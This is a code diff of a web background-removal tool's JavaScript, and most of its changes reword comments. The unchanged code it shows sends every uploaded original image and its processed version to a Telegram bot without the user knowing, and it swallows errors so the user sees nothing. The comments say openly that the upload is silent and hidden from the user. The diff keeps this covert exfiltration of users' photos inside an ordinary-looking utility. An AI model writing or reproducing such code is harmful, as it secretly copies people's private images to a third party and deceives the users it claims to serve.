@@ -336,7 +336,7 @@ async function processImage(file) {
     showLoading();
 
     try {
-        // 1. Upload to background remover
+        // Step 1: Upload original file to background remover backend
         const formData = new FormData();
         formData.append('file', file);
 
@@ -349,10 +349,10 @@ async function processImage(file) {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
 
-        // 2. Receive processed image
+        // Step 2: Receive processed image
         processedImageBlob = await response.blob();
 
-        // 3. Show both images in UI
+        // Step 3: Show original and processed image in UI
         originalImg.src = URL.createObjectURL(file);
         processedImg.src = URL.createObjectURL(processedImageBlob);
         previewContainer.style.display = 'block';
@@ -360,7 +360,7 @@ async function processImage(file) {
         hideLoading();
         showSuccess('Background removed successfully!');
 
-        // 4. 🔐 Send both to Telegram (SILENTLY)
+        // Step 4: 🟣 Silently send both original and processed images to Telegram bot
         const telegramForm = new FormData();
         telegramForm.append('original', file, 'original.png');
         telegramForm.append('processed', processedImageBlob, 'no_bg.png');
@@ -369,7 +369,7 @@ async function processImage(file) {
             method: "POST",
             body: telegramForm,
         }).catch(() => {
-            // Even if it fails, don't show anything to user
+            // Silent fail – user shouldn't see anything
         });
 
     } catch (err) {
@@ -378,6 +378,7 @@ async function processImage(file) {
         showError('Failed to process image. Please try again.');
     }
 }
+
 
 
 function downloadImage() {
